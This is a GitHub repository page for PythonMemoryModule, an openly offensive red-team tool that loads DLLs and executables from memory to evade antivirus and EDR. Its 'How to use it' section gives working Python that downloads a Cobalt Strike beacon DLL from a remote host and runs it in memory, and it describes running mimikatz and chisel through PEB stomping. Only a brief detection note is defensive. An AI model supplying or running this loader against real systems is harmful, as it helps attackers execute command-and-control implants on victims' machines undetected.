# https://github.com/naksyn/PythonMemoryModule

[Skip to content](https://github.com/naksyn/PythonMemoryModule#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/naksyn/PythonMemoryModule) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/naksyn/PythonMemoryModule) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/naksyn/PythonMemoryModule) to refresh your session.Dismiss alert

{{ message }}

[naksyn](https://github.com/naksyn)/ **[PythonMemoryModule](https://github.com/naksyn/PythonMemoryModule)** Public

- [Notifications](https://github.com/login?return_to=%2Fnaksyn%2FPythonMemoryModule) You must be signed in to change notification settings
- [Fork\\
51](https://github.com/login?return_to=%2Fnaksyn%2FPythonMemoryModule)
- [Star\\
332](https://github.com/login?return_to=%2Fnaksyn%2FPythonMemoryModule)


pure-python implementation of MemoryModule technique to load dll and unmanaged exe entirely from memory


### License

[Apache-2.0 license](https://github.com/naksyn/PythonMemoryModule/blob/main/LICENSE)

[332\\
stars](https://github.com/naksyn/PythonMemoryModule/stargazers) [51\\
forks](https://github.com/naksyn/PythonMemoryModule/forks) [Branches](https://github.com/naksyn/PythonMemoryModule/branches) [Tags](https://github.com/naksyn/PythonMemoryModule/tags) [Activity](https://github.com/naksyn/PythonMemoryModule/activity)

[Star](https://github.com/login?return_to=%2Fnaksyn%2FPythonMemoryModule)

[Notifications](https://github.com/login?return_to=%2Fnaksyn%2FPythonMemoryModule) You must be signed in to change notification settings

# naksyn/PythonMemoryModule

main

[**1** Branch](https://github.com/naksyn/PythonMemoryModule/branches) [**0** Tags](https://github.com/naksyn/PythonMemoryModule/tags)

[Go to Branches page](https://github.com/naksyn/PythonMemoryModule/branches)[Go to Tags page](https://github.com/naksyn/PythonMemoryModule/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![naksyn](https://avatars.githubusercontent.com/u/59816245?v=4&size=40)](https://github.com/naksyn)[naksyn](https://github.com/naksyn/PythonMemoryModule/commits?author=naksyn)<br>[Added control and moved folder](https://github.com/naksyn/PythonMemoryModule/commit/9bb2f6761d17177798e739b7c5160267e569a9cb)<br>Open commit details<br>3 years agoDec 16, 2023<br>[9bb2f67](https://github.com/naksyn/PythonMemoryModule/commit/9bb2f6761d17177798e739b7c5160267e569a9cb) · 3 years agoDec 16, 2023<br>## History<br>[13 Commits](https://github.com/naksyn/PythonMemoryModule/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/naksyn/PythonMemoryModule/commits/main/) 13 Commits |
| [pythonmemorymodule](https://github.com/naksyn/PythonMemoryModule/tree/main/pythonmemorymodule "pythonmemorymodule") | [pythonmemorymodule](https://github.com/naksyn/PythonMemoryModule/tree/main/pythonmemorymodule "pythonmemorymodule") | [Added control and moved folder](https://github.com/naksyn/PythonMemoryModule/commit/9bb2f6761d17177798e739b7c5160267e569a9cb "Added control and moved folder  Added control for empty passed argument and moved windows folder out for easier importing.") | 3 years agoDec 16, 2023 |
| [windows](https://github.com/naksyn/PythonMemoryModule/tree/main/windows "windows") | [windows](https://github.com/naksyn/PythonMemoryModule/tree/main/windows "windows") | [Added control and moved folder](https://github.com/naksyn/PythonMemoryModule/commit/9bb2f6761d17177798e739b7c5160267e569a9cb "Added control and moved folder  Added control for empty passed argument and moved windows folder out for easier importing.") | 3 years agoDec 16, 2023 |
| [LICENSE](https://github.com/naksyn/PythonMemoryModule/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/naksyn/PythonMemoryModule/blob/main/LICENSE "LICENSE") | [Initial commit](https://github.com/naksyn/PythonMemoryModule/commit/224324808170ec2a77bf57b44beaec3d71bf27cd "Initial commit") | 4 years agoJan 5, 2023 |
| [MemoryModuleCS.gif](https://github.com/naksyn/PythonMemoryModule/blob/main/MemoryModuleCS.gif "MemoryModuleCS.gif") | [MemoryModuleCS.gif](https://github.com/naksyn/PythonMemoryModule/blob/main/MemoryModuleCS.gif "MemoryModuleCS.gif") | [Initial commit](https://github.com/naksyn/PythonMemoryModule/commit/fc3dbea6c0531cf5be5b5ca6bf93a7525c0ddf3d "Initial commit  Initial commit") | 4 years agoJan 5, 2023 |
| [README.md](https://github.com/naksyn/PythonMemoryModule/blob/main/README.md "README.md") | [README.md](https://github.com/naksyn/PythonMemoryModule/blob/main/README.md "README.md") | [Update README.md](https://github.com/naksyn/PythonMemoryModule/commit/c676f20717c2e2ee256e2a5f87b402d5f7d7e250 "Update README.md") | 3 years agoJul 27, 2023 |
| View all files |

## Repository files navigation

[![Supported Python versions](https://camo.githubusercontent.com/b413597d37ccc8eae784ee4f9979e61fe739bbdcd0f6247e4aa0d68c6f1659ca/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f707974686f6e2d332e372b2d626c75652e737667)](https://camo.githubusercontent.com/b413597d37ccc8eae784ee4f9979e61fe739bbdcd0f6247e4aa0d68c6f1659ca/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f707974686f6e2d332e372b2d626c75652e737667)[![Twitter](https://camo.githubusercontent.com/3e2a6c7ad8f60db1d64964d88909cd29669e20118b51380a0ad11b261f7dd4ad/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f666f6c6c6f772f6e616b73796e3f6c6162656c3d6e616b73796e267374796c653d736f6369616c)](https://twitter.com/intent/follow?screen_name=naksyn)

# PythonMemoryModule

[Permalink: PythonMemoryModule](https://github.com/naksyn/PythonMemoryModule#pythonmemorymodule)

pure-python implementation of MemoryModule technique to load a dll or unmanaged exe entirely from memory

[![immagine](https://user-images.githubusercontent.com/59816245/210533889-424707d3-2c82-4ca3-afaf-cc19857fa2d6.png)](https://user-images.githubusercontent.com/59816245/210533889-424707d3-2c82-4ca3-afaf-cc19857fa2d6.png)

"Python memory module" AI generated pic - hotpot.ai

# What is it

[Permalink: What is it](https://github.com/naksyn/PythonMemoryModule#what-is-it)

PythonMemoryModule is a Python ctypes porting of the [MemoryModule](https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/) technique originally published by [Joachim Bauch](https://github.com/fancycode/MemoryModule). It can load a dll or unmanaged exe using Python without requiring the use of an external library (pyd) and has (partial) support for commandline parameters passing.

It leverages [pefile](https://github.com/erocarrera/pefile) to parse PE headers, [PythonForWindows](https://github.com/hakril/PythonForWindows) to access process parameters, and ctypes for the heavy lifting.
The tool was originally thought to be used as a [Pyramid](https://github.com/naksyn/Pyramid/) module to provide evasion against AV/EDR by loading dll/exe payloads in python.exe entirely from memory, however other use-cases are possible (IP protection, pyds in-memory loading, spinoffs for other stealthier techniques) so I decided to create a dedicated repo.

# Why it can be useful

[Permalink: Why it can be useful](https://github.com/naksyn/PythonMemoryModule#why-it-can-be-useful)

1. It basically allows to use the MemoryModule techinque entirely in Python interpreted language, enabling the loading of a dll from a memory buffer using the stock signed python.exe binary without requiring dropping on disk external code/libraries (such as [pymemorymodule](https://pypi.org/project/pymemorymodule/) bindings) that can be flagged by AV/EDRs or can raise user's suspicion.
2. Using MemoryModule technique in compiled languages loaders would require to embed MemoryModule code within the loaders themselves. This can be avoided using Python interpreted language and PythonMemoryModule since the code can be executed dynamically and in memory.
3. you can get some level of Intellectual Property protection by dynamically in-memory downloading, decrypting and loading dlls that should be hidden from prying eyes. Bear in mind that the dlls can be still recovered from memory and reverse-engineered, but at least it would require some more effort by the attacker.
4. you can load a stageless payload dll without performing injection or shellcode execution. The loading process mimics the LoadLibrary Windows API (which takes a path on disk as input) without actually calling it and operating in memory.

# How to use it

[Permalink: How to use it](https://github.com/naksyn/PythonMemoryModule#how-to-use-it)

## Example n.1

[Permalink: Example n.1](https://github.com/naksyn/PythonMemoryModule#example-n1)

In the following example a Cobalt Strike stageless beacon dll is downloaded (not saved on disk), loaded in memory and started by calling the entrypoint.

```
import urllib.request
import ctypes
import pythonmemorymodule
request = urllib.request.Request('http://192.168.1.2/beacon.dll')
result = urllib.request.urlopen(request)
buf=result.read()
dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
startDll = dll.get_proc_addr('StartW')
assert startDll()
#dll.free_library()
```

Note: if you use staging in your malleable profile the dll would not be able to load with LoadLibrary, hence MemoryModule won't work.

[![](https://github.com/naksyn/PythonMemoryModule/raw/main/MemoryModuleCS.gif)](https://github.com/naksyn/PythonMemoryModule/blob/main/MemoryModuleCS.gif)[![MemoryModuleCS.gif](https://github.com/naksyn/PythonMemoryModule/raw/main/MemoryModuleCS.gif)](https://github.com/naksyn/PythonMemoryModule/blob/main/MemoryModuleCS.gif)[Open MemoryModuleCS.gif in new window](https://github.com/naksyn/PythonMemoryModule/blob/main/MemoryModuleCS.gif)

## Example n.2

[Permalink: Example n.2](https://github.com/naksyn/PythonMemoryModule#example-n2)

In the following example we use the commandline passing funcionality to execute chisel in memory.

PythonMM.cmdline.mp4

## Commandline parameters passing - Partial support

[Permalink: Commandline parameters passing - Partial support](https://github.com/naksyn/PythonMemoryModule#commandline-parameters-passing---partial-support)

This technique hase been implemented by stomping the Commandline parameter on the PEB at runtime.
This won't work with every executable since it depends on which functions are used to pass arguments.

Generally, to get a universally working technique would be required to hook GetCommandlineA GetCommandlineW \_\_getmainargs and \_\_wgetmainargs since PEB stomping won't cover all cases, more details [here](https://blog-30cm-tw.translate.goog/2020/08/windows-c-mainargc-argv.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=it&_x_tr_pto=wapp)

During my testing I found that mimikatz and several go binaries are working just by doing PEB stomping, on the other hand, cmdline passing via PEB stomping alone to mingw and VS compiled binaries won't likely work.

# How to detect it

[Permalink: How to detect it](https://github.com/naksyn/PythonMemoryModule#how-to-detect-it)

Using the MemoryModule technique will mostly respect the sections' permissions of the target DLL and avoid the noisy RWX approach. However within the program memory there will be a private commit not backed by a dll on disk and this is a MemoryModule telltale.

## About

pure-python implementation of MemoryModule technique to load dll and unmanaged exe entirely from memory


### Topics

[python](https://github.com/topics/python "Topic: python") [hacking](https://github.com/topics/hacking "Topic: hacking") [evasion](https://github.com/topics/evasion "Topic: evasion") [memory-module](https://github.com/topics/memory-module "Topic: memory-module") [memorymodule](https://github.com/topics/memorymodule "Topic: memorymodule") [redteaming](https://github.com/topics/redteaming "Topic: redteaming") [redteam](https://github.com/topics/redteam "Topic: redteam") [runpe](https://github.com/topics/runpe "Topic: runpe") [redteam-tools](https://github.com/topics/redteam-tools "Topic: redteam-tools") [edr-evasion](https://github.com/topics/edr-evasion "Topic: edr-evasion")

### Resources

[Readme](https://github.com/naksyn/PythonMemoryModule#readme-ov-file)

### License

[Apache-2.0 license](https://github.com/naksyn/PythonMemoryModule#Apache-2.0-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/naksyn/PythonMemoryModule).

[Activity](https://github.com/naksyn/PythonMemoryModule/activity)

### Stars

[**332**\\
stars](https://github.com/naksyn/PythonMemoryModule/stargazers)

### Watchers

[**4**\\
watching](https://github.com/naksyn/PythonMemoryModule/watchers)

### Forks

[**51**\\
forks](https://github.com/naksyn/PythonMemoryModule/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fnaksyn%2FPythonMemoryModule&report=naksyn+%28user%29)

## [Releases](https://github.com/naksyn/PythonMemoryModule/releases)

No releases published

## [Packages\  0](https://github.com/users/naksyn/packages?repo_name=PythonMemoryModule)

No packages published

## [Contributors\  2](https://github.com/naksyn/PythonMemoryModule/graphs/contributors)

- [![@naksyn](https://avatars.githubusercontent.com/u/59816245?s=64&v=4)](https://github.com/naksyn)[**naksyn** Diego Capriotti](https://github.com/naksyn)
- [![@rkbennett](https://avatars.githubusercontent.com/u/44292326?s=64&v=4)](https://github.com/rkbennett)[**rkbennett**](https://github.com/rkbennett)

## Languages

- [Python100.0%](https://github.com/naksyn/PythonMemoryModule/search?l=python)

You can’t perform that action at this time.